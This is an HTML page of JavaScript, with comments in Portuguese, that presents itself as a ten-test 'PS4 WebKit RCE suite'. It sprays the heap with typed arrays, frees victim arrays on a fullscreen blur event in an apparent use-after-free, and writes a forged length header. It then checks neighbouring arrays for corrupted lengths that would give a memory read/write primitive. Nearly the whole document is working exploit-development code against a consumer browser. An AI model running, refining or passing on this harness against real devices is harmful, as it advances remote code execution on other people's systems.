<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE SUITE V3.0 - THE DECALIBRATOR</title>
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'Consolas', monospace; padding: 10px; font-size: 14px; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .panel { border: 1px solid #333; background: #111; padding: 10px; }
        button { background: #222; color: #fff; border: 1px solid #555; padding: 8px; width: 100%; cursor: pointer; text-align: left; }
        button:hover { background: #004400; border-color: #00ff41; }
        button.active { background: #006600; border-color: #fff; font-weight: bold; }
        #log { height: 300px; overflow-y: scroll; border: 1px solid #333; background: #000; padding: 5px; color: #ccc; }
        .success { color: #0f0; font-weight: bold; background: #002200; }
        .info { color: #aaa; }
    </style>
</head>
<body>

<h1>PS4 WEBKIT RCE SUITE V3.0 (10 REAL TESTS)</h1>
<p>Status: <span id="status">Selecione um teste...</span></p>

<div class="grid">
    <div class="panel">
        <h3>GRUPO A: ALINHAMENTO FINO</h3>
        <button onclick="setTest(1)">TESTE 1: Spray Padrão (24 bytes)</button>
        <button onclick="setTest(2)">TESTE 2: Shift +8 bytes (32 bytes)</button>
        <button onclick="setTest(3)">TESTE 3: Shift +16 bytes (40 bytes)</button>
        <button onclick="setTest(4)">TESTE 4: Shift +24 bytes (48 bytes)</button>
        <button onclick="setTest(5)">TESTE 5: Shift +32 bytes (56 bytes)</button>
    </div>
    <div class="panel">
        <h3>GRUPO B: ESTRATÉGIA AVANÇADA</h3>
        <button onclick="setTest(6)">TESTE 6: Heavy Spray (128 bytes - Overflow Bruto)</button>
        <button onclick="setTest(7)">TESTE 7: Timing Delay (Spray atrasado 10ms)</button>
        <button onclick="setTest(8)">TESTE 8: Geometry Check (Escreve ID único)</button>
        <button onclick="setTest(9)">TESTE 9: Header Hunter (Tenta forjar 0x10000)</button>
        <button onclick="setTest(10)">TESTE 10: Null Spray (Apaga tudo com zeros)</button>
    </div>
</div>

<div class="panel">
    <button id="btnAlloc" onclick="runSetup()" disabled>1. PREPARAR HEAP (ALOCAR)</button>
    <button id="btnTrigger" onclick="triggerExploit()" disabled style="margin-top:5px; color: yellow;">2. DISPARAR (FULLSCREEN + OPTIONS)</button>
    <button id="btnCheck" onclick="analyze()" disabled style="margin-top:5px; color: cyan;">3. ANALISAR RESULTADOS</button>
</div>

<div id="log">Logs do sistema...</div>

<script>
    const LOG = document.getElementById('log');
    function log(txt) { LOG.innerHTML = `[${new Date().toLocaleTimeString()}] ${txt}<br>` + LOG.innerHTML; }

    // --- CONFIGURAÇÕES ---
    var currentTest = 0;
    var victims = [];
    var neighbors = []; // O alvo da nossa corrupção
    var sprayStorage = [];
    
    // CONSTANTES CRÍTICAS PARA RCE
    // 0x0001000000000100 -> Length grande + Flags
    const FAKE_LENGTH = 1.3906717577229e-309; 
    const MARKER_VAL = 1337.1337;

    function setTest(n) {
        currentTest = n;
        document.getElementById('status').innerText = `TESTE ${n} SELECIONADO`;
        document.getElementById('btnAlloc').disabled = false;
        
        // Descrição do teste
        let desc = "";
        if(n<=5) desc = `Fuzzing de Tamanho: Tenta alinhar o spray com deslocamento de ${(n-1)*8} bytes.`;
        if(n==6) desc = "Usa objetos muito maiores que o buraco para forçar corrupção massiva.";
        if(n==7) desc = "Espera o Garbage Collector respirar antes de fazer o spray.";
        if(n==8) desc = "Escreve um valor numérico fixo para verificar se conseguimos escrever NO vizinho.";
        if(n==9) desc = "Tenta escrever EXATAMENTE o cabeçalho de 'Length' falso.";
        if(n==10) desc = "Escreve zeros. Se o vizinho sumir ou virar tamanho 0, funcionou.";
        log(`Configurado: ${desc}`);
    }

    function runSetup() {
        log("Alocando Heap (Feng Shui)...");
        victims = [];
        neighbors = [];
        sprayStorage = [];
        const COUNT = 10000;

        try {
            for(let i=0; i<COUNT; i++) {
                // O Vizinho (que queremos hackear)
                let n = new Float64Array(8);
                n[0] = 0.1; // Valor seguro
                n.testID = i; // Metadado JS
                neighbors.push(n);

                // A Vítima (o buraco)
                let v = new Float64Array(8);
                v.fill(1.1);
                victims.push(v);
            }
            log("Heap alocado. 10.000 pares criados.");
            document.getElementById('btnTrigger').disabled = false;
        } catch(e) { log("Erro: " + e); }
    }

    function triggerExploit() {
        log("Solicitando Fullscreen...");
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        window.onblur = function() {
            log(`BLUR! Executando TESTE ${currentTest}...`);
            
            // 1. FREE
            victims = null; 

            // 2. SPRAY LOGIC (Baseado no Teste)
            let spraySize = 24;
            let payload = 1.1;

            // Grupo A: Tamanhos
            if(currentTest === 1) spraySize = 24;
            if(currentTest === 2) spraySize = 32;
            if(currentTest === 3) spraySize = 40;
            if(currentTest === 4) spraySize = 48;
            if(currentTest === 5) spraySize = 56;
            
            // Grupo B: Especial
            if(currentTest === 6) spraySize = 128; // Brutal
            
            // Payloads
            if(currentTest === 8) payload = MARKER_VAL; // 1337.1337
            if(currentTest === 9) payload = FAKE_LENGTH; // God Mode Header
            if(currentTest === 10) payload = 0; // Zeros

            // Execução
            if(currentTest === 7) {
                // Delay mode
                setTimeout(() => doSpray(spraySize, payload), 10);
            } else {
                doSpray(spraySize, payload);
            }
        };
    }

    function doSpray(size, val) {
        try {
            for(let i=0; i<20000; i++) {
                let s = new Float64Array(size);
                s.fill(val);
                sprayStorage.push(s);
            }
            log("Spray concluído.");
            document.getElementById('btnCheck').disabled = false;
        } catch(e) {}
    }

    function analyze() {
        log("Analisando 10.000 vizinhos...");
        let success = false;
        
        for(let i=0; i<neighbors.length; i++) {
            let n = neighbors[i];
            
            // CHECAGEM 1: CORRUPÇÃO DE LENGTH (RCE GOLD)
            if(n.length !== 8) {
                success = true;
                log(`<span class='success'>[!!!] GOD MODE DETECTADO!</span>`);
                log(`Vizinho Index: ${i} | Novo Length: ${n.length}`);
                log(`ESTE É O SEU RCE! Teste ${currentTest} funcionou!`);
                break;
            }

            // CHECAGEM 2: CORRUPÇÃO DE DADOS (WRITE PRIMITIVE)
            if(n[0] !== 0.1) {
                // Filtra falsos positivos (0 pode ser desalocação)
                if(n[0] === MARKER_VAL || n[0] === FAKE_LENGTH || n[0] === 0) {
                    success = true;
                    log(`<span class='success'>[+] CORRUPÇÃO CONFIRMADA!</span>`);
                    log(`Vizinho Index: ${i} | Valor lido: ${n[0]}`);
                    
                    if(n[0] === MARKER_VAL) log("Escrevemos 1337.1337 no vizinho!");
                    if(n[0] === FAKE_LENGTH) log("Escrevemos o Header, mas o alinhamento falhou por poucos bytes.");
                    break;
                }
            }
        }

        if(!success) log("Nenhum vizinho afetado. Tente o próximo teste.");
    }

</script>
</body>
</html>
